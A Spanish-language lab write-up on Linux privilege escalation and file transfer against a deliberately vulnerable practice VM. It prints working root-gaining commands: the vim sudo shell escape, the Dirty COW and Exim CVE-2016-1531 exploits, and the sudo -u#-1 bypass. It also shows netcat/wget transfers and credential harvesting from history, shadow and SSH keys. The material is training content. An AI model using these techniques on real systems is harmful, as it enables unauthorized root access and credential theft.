Parte de [[Maquinas]]

Pensada para practicar escalada de privilegios y la transferencia de ficheros.

Iniciamos un arpsweep para ver la IP:

``` java
sudo nmap -sn 192.168.56.100/24 -oN arpsweep.txt
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-18 18:42 CET
Nmap scan report for 192.168.56.1
Host is up (0.00018s latency).
MAC Address: 0A:00:27:00:00:00 (Unknown)
Nmap scan report for 192.168.56.10
Host is up (0.000087s latency).
MAC Address: 08:00:27:71:A9:96 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.202
Host is up (0.00023s latency).
MAC Address: 08:00:27:38:B1:F9 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.100
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 2.00 seconds
```

Y lanzamos un portscan:

``` java
sudo nmap -sS -T4 -p- 192.168.56.202 -oN portscan.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-18 18:43 CET
Nmap scan report for 192.168.56.202
Host is up (0.000087s latency).
Not shown: 65526 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
25/tcp    open  smtp
80/tcp    open  http
111/tcp   open  rpcbind
2049/tcp  open  nfs
8080/tcp  open  http-proxy
36097/tcp open  unknown
37514/tcp open  unknown
41308/tcp open  unknown
MAC Address: 08:00:27:38:B1:F9 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.75 seconds
```

El escaneo de puertos:

``` java
❯ sudo nmap -A -sS -T4 -p 22,25,80,111,2049,8080,36097,37514,41308 192.168.56.202 -oN service_scan.txt
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-18 19:40 CET
Nmap scan report for 192.168.56.202
Host is up (0.00099s latency).

PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 5.5p1 Debian 6+squeeze5 (protocol 2.0)
| ssh-hostkey: 
|   1024 a4:6c:d1:c8:5b:03:f2:af:33:3f:84:15:cf:15:ed:ba (DSA)
|_  2048 08:84:3e:96:4d:9a:2f:a1:db:be:68:29:80:ab:f3:56 (RSA)
25/tcp    open  smtp     Exim smtpd 4.84
| smtp-commands: debian.localdomain Hello nmap.scanme.org [192.168.56.100], SIZE 52428800, 8BITMIME, PIPELINING, HELP
|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA NOOP QUIT RSET HELP
80/tcp    open  http     Apache httpd 2.2.16 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.2.16 (Debian)
111/tcp   open  rpcbind  2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/udp   nfs
|   100005  1,2,3      41308/tcp   mountd
|   100005  1,2,3      59934/udp   mountd
|   100021  1,3,4      36097/tcp   nlockmgr
|   100021  1,3,4      50041/udp   nlockmgr
|   100024  1          37514/tcp   status
|_  100024  1          56819/udp   status
2049/tcp  open  nfs      2-4 (RPC #100003)
8080/tcp  open  http     nginx 1.6.2
|_http-title: Welcome to nginx on Debian!
|_http-server-header: nginx/1.6.2
|_http-open-proxy: Proxy might be redirecting requests
36097/tcp open  nlockmgr 1-4 (RPC #100021)
37514/tcp open  status   1 (RPC #100024)
41308/tcp open  mountd   1-3 (RPC #100005)
MAC Address: 08:00:27:38:B1:F9 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6.32
OS details: Linux 2.6.32
Network Distance: 1 hop
Service Info: Host: debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.99 ms 192.168.56.202

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.95 seconds
```

Tenemos las credenciales de SSH para empezar a trabajar:

Hay dos usuarios user:password321 y root:password123

``` java
❯ ssh user@192.168.56.202
The authenticity of host '192.168.56.202 (192.168.56.202)' can't be established.
RSA key fingerprint is SHA256:JwwPVfqC+8LPQda0B9wFLZzXCXcoAho6s8wYGjktAnk.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.202' (RSA) to the list of known hosts.
user@192.168.56.202's password: 
Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Feb 21 07:35:58 2024
user@debian:~$ 
user@debian:~$ 
user@debian:~$ ls
backups  myvpn.ovpn  tools
user@debian:~$ sudo -l
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH

User user may run the following commands on this host:
    (root) NOPASSWD: /bin/cat
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more
    (root) NOPASSWD: /usr/bin/ssh
    (root) NOPASSWD: /usr/sbin/nginx
    (root) SETENV: NOPASSWD: /usr/local/bin/network.sh
    (ALL, !root) NOPASSWD: ALL
```

Hay cientos de metodos de escalada por lo que vemos.

Por ejemplo con Vim y GTFOBins, vemos que mediante

``` java
sudo vim -c ':!/bin/sh'
```

Somos root.

---

La parte mas importante de la escalada de privilegios es la enumeracion:

```
whoami
id
pwd
ls -lahF
lf -lhF /home
cat /etc/passwd
sudo -l
crontab -l
cat /etc/crontab
cat /etc/issue
lsb_release -a
cat /etc/*-release
uname -a
cat /proc/version
ps aux
ps -ef
ps -ef --forest
ps axjf
dpkg -l
find / -type f -perm 0777
find / -type f -perm +111
etc...
```

Esto se puede automatizar como por ejemplo mediante linpeass

---

En esta maquina LinPEAS ya esta en /tools, pero podemos subilar tambien mediante transferencia de ficheros, por ejemplo mediante HTTP con python.

En Kali:

``` java
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.56.202 - - [18/Mar/2025 19:12:21] "GET /linpeas.sh HTTP/1.0" 200 -
```

En LPEP:

``` java
user@debian:~$ wget http://192.168.56.100/linpeas.sh
--2025-03-18 15:12:21--  http://192.168.56.100/linpeas.sh
Connecting to 192.168.56.100:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 840082 (820K) [text/x-sh]
Saving to: “linpeas.sh”

100%[================================================================================>] 840,082     --.-K/s   in 0.01s   

2025-03-18 15:12:21 (76.3 MB/s) - “linpeas.sh” saved [840082/840082]

user@debian:~$ 
```

Otra opcion tipica seria tambien por ejemplo mediante scp:

``` java
scp linpeas.sh user@192.168.56.202:/home/user/
```

(No haria falta poner /home/user ya que la ruta defectiva es ~)

Tambien podriamos emplear netcat

Desde debian:

``` java
nc -nlvp 4444 > linpeas.sh
```

Y desde Kali:

```
nc 192.168.56.202 4444 < linpeas.sh 
```

Muchas veces no hay detach automatico, asi que habra que estimar cuando termina la transferencia.

O a la inversa, desde kali:

``` java
ncat -lnvp 4444 < linpeas.sh
```

Y al conectarnos desde debian:

``` java
nc 192.168.56.100 4444 > linpeas.sh
```

Hay mas informacion sobre transferencias de ficheros en GTFOBins y en HackTricks

---

En cuanto a escalada de privilegios, un ejemplo es usar exploits de kernel. Por ejemplo en este caso dirtycow (un fallo en el kernel que permite a un usuario no privilegiado modificar ficheros a los que solo podria acceder en modo lectura)

Ejemplo:

En este caso tenemos dirtycow en /tools:

Podemos compilarlo y ejecutarlo.

``` bash
gcc -pthread c0w.c -o c0 
./c0
```

Tras un cierto tiempo recuperaremos la terminal.

Una señal de funcionamiento del exploit es el fichero .bak en tmp:

``` bash
user@debian:~/tools/dirtycow$ ls -lhF /tmp/
total 1.8M
-rw-r--r-- 1 root root 1.7M Mar 18 16:02 backup.tar.gz
-rwxr-xr-x 1 user user  43K Mar 18 15:59 bak*
-rw-r--r-- 1 root root   29 Mar 18 16:02 useless
-rw-r--r-- 1 root root   29 Mar 18 16:02 useless2
user@debian:~/tools/dirtycow$ 
```

Lo que hemos hecho ha sido machacar passwd con otro archivo, y ahora en vez de servir para cambiar la contraseña instancia una shell como el usuario root:

``` bash
user@debian:~/tools/dirtycow$ /usr/bin/passwd
root@debian:/home/user/tools/dirtycow# id
uid=0(root) gid=1000(user) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
```

En el fichero .bak mencionado antes esta el binario passwd bueno.

Podemos revertir el binario a su estado original mediante:

``` bash
cp /tmp/bak /usr/bin/passwd
rm -rf /tmp/bak
```

Otro exploit por ejemplo es el de exim4 (el servidor SMTP del puerto 25) que se puede utilizar en la version 4.86.2 SI TIENE el bit SETUID root Y SI se instalo a traves de perl_startup.

Podemos comprobarlo:

``` bash
user@debian:~$ exim -bV
Exim version 4.84 #3 built 13-May-2017 01:45:35
Copyright (c) University of Cambridge, 1995 - 2014
(c) The Exim Maintainers and contributors in ACKNOWLEDGMENTS file, 2007 - 2014
Probably GDBM (native mode)
Support for: crypteq iconv() Perl DKIM PRDR OCSP
```

Vemos que es la version correcta y que tiene soporte para perl:

``` bash
user@debian:~$ head /etc/exim.conf
######################################################################
#                  Runtime configuration file for Exim               #
######################################################################

perl_startup = do '/usr/share/exim4/exigrey.pl'

# This is a default configuration file which will operate correctly in
# uncomplicated installations. Please see the manual for a complete list
# of all the runtime configuration options that can be included in a
# configuration file. There are many more than are mentioned here. The
```

Tiene el perl_startup activado.

``` bash
user@debian:~$ ls -lhaF /usr/sbin/exim-4.84-3 
-rwsr-xr-x 1 root root 942K May 13  2017 /usr/sbin/exim-4.84-3*
```

Y tiene el SUID activado, con lo cual deberia ser vulnerable.

``` bash
user@debian:~$ cd tools/exim/
user@debian:~/tools/exim$ ./cve-2016-1531.sh 
[ CVE-2016-1531 local root exploit
sh-4.1# whoami
root
```

Y somos root.

Otro ejemplo posible en esta máquina seria explotar el binario sudo.
Una cuenta Run as ALL es una cuenta configurada mediante /etc/sudoers tal que user ALL = (ALL,!root) NOPASSWD: ALL

Se lee como "Permito al usuario user ejecutar cualquier comando del sistema como cualquier usuario MENOS root".

Mediante:

``` bash
user@debian:~/tools/exim$ dpkg -l | grep -i sudo
ii  sudo                                1.7.4p4-2.squeeze.6          Provide limited super user privileges to specific users
```

Vemos que estamos en una version vulnerable.

Veamos:

``` bash
user@debian:~/tools/exim$ sudo -u root whoami
[sudo] password for user: 
Sorry, user user is not allowed to execute '/usr/bin/whoami' as root on debian.localdomain.
```

Funciona como se espera gracias al fichero sudoers, con www-data:

``` bash
user@debian:~/tools/exim$ sudo -u www-data whoami
www-data
```

Funciona correctamente. Utilizando UIDs en vez del nombre:

``` bash
user@debian:~/tools/exim$ sudo -u#0 whoami  
[sudo] password for user: 
Sorry, user user is not allowed to execute '/usr/bin/whoami' as root on debian.localdomain.

user@debian:~/tools/exim$ sudo -u#33 whoami 
www-data
```

Funciona tambien como se espera, pero mediante el UID -1:

``` bash
user@debian:~/tools/exim$ sudo -u#-1 whoami
root
```

Asi que ahora seria tan simple como:

``` bash
user@debian:~/tools/exim$ sudo -u#-1 bash  
root@debian:/home/user/tools/exim# 
```

Otro ejemplo mucho mas simple de contraseñas filtradas seria ver el historial, en este caso con el comando history podemos ver:

``` bash
    4  mysql -h somehost.local -uroot -ppassword123
```

Que ademas, el historial se escribe en .bash_history en home/user cuando se cierra sesion. Esto puede ser especialmente problematico si la empresa tiene SIEM porque los tecnicos podran ver la contraseña.

Otra opcion seria ver si exiten claves SSH expuestas para acceder al sistema, ademas, si se consigue, aunque el usuario cambie la contraseña seguimos teniendo persistencia ya que la clave privada no cambia.

Otro ejemplo mas seria el sudo shell scape. Como por ejemplo en vim, less, more ... O cualquier binario que tenga salidas a comandos, podemos ver muchos ejemplos en GTFOBins. Si por ejemplo podemos usar cat como sudo podriamos ver /etc/shadow, pero habria que crackear contraseñas, pero sin embargo podemos por ejemplo leer claves SSH de admins.